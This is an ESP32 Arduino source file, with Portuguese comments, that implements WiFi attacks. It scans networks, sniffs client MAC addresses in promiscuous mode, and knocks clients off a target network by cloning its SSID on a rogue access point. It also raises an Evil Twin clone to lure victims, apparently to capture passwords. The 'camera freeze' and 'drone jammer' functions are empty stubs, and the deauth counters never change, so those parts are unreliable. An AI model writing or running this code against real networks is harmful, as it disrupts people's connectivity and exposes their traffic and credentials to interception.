// ============================================================
// wifi_attacks.cpp - v6.0 (ROGUE AP APPROACH)
//
// NAO usa esp_wifi_80211_tx nem bypass.
// Funciona em QUALQUER versao do ESP-IDF/Arduino-ESP32.
//
// PRINCIPIO:
// 1. Sobe AP com mesmo SSID e canal do alvo
// 2. max_connection=0 -> driver ESP32 automaticamente manda deauth
//    para qualquer cliente que tente se associar
// 3. Promiscuous monitora clientes do alvo
// 4. Evil Twin: deauth via rogue AP -> depois clone visivel
//
// Baseado no paper: "Wi-Fi attacks using ESP32" (FIT VUTBR)
// e na ferramenta esp32-wifi-penetration-tool (risinek)
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static unsigned long deauthStartTime = 0;

// ============================================================
// CLIENT DISCOVERY
// ============================================================
#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;
    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x02:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (pkt->rx_ctrl.rx_state != 0) return;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;
    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (frameBssid[0] == 0xFF) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5]);
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    promiscuousActive = true;
    Serial.println("[Promisc] Started");
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
    Serial.println("[Promisc] Stopped");
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);
    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d BSSID:%02X:%02X:%02X:%02X:%02X:%02X\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH - ROGUE AP (sem raw_tx, sem bypass)
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    clientCount = 0;
    deauthStartTime = millis();

    Serial.printf("\n[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
    Serial.printf("[Deauth] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    // Desliga WiFi
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    // Sobe AP com MESMO SSID e canal do alvo, max_connection=0
    // O driver ESP32 automaticamente manda deauth para clientes
    // nao-autenticados que tentam se associar
    WiFi.mode(WIFI_AP);
    delay(300);

    bool apOk = WiFi.softAP(target->ssid, "", target->channel, 0, 0);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);

    Serial.printf("[Deauth] Rogue AP: %s CH%d (softAP: %s)\n",
        target->ssid, target->channel, apOk ? "OK" : "FAIL");
    Serial.println("[Deauth] Driver auto-deauth active (max_conn=0)");

    startPromiscuous();

    deauthActive = true;
    Serial.println("[Deauth] STARTED - Rogue AP mode");
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Runtime: %lu sec, clients discovered: %d\n",
            (millis() - deauthStartTime) / 1000, clientCount);
    }
    deauthActive = false;
    stopPromiscuous();

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(300);
    WiFi.mode(WIFI_STA);
    delay(200);

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// LOOP DE DEAUTH - so monitora e conta
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // O driver faz o deauth automaticamente.
    // Aqui so monitoramos e contamos clientes descobertos.
    static unsigned long lastDebug = 0;
    if (millis() - lastDebug > 5000) {
        lastDebug = millis();
        int staNum = WiFi.softAPgetStationNum();
        Serial.printf("[Deauth] runtime=%lus clients=%d CH%d stations_on_ap=%d\n",
            (millis() - deauthStartTime) / 1000,
            clientCount,
            deauthTargetChannel,
            staNum);
    }
    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // FASE 1: Rogue AP deauth (mesmo SSID, max_conn=0)
    Serial.println("[EvilTwin] Phase 1: Rogue AP deauth...");
    startDeauth(networkIndex);

    unsigned long start = millis();
    while (millis() - start < 5000) {
        deauthLoop();
        delay(1);
    }

    // FASE 2: Para rogue, sobe clone visivel
    Serial.println("[EvilTwin] Phase 2: Clone AP...");
    stopPromiscuous();

    WiFi.softAPdisconnect(true);
    delay(300);

    // Clone com mesmo SSID, aceita conexoes
    WiFi.softAP(target->ssid, "", target->channel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));

    fakeAPEnabled = true;
    passwordCaptured = false;

    Serial.printf("[EvilTwin] Clone AP: %s CH%d\n", target->ssid, target->channel);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
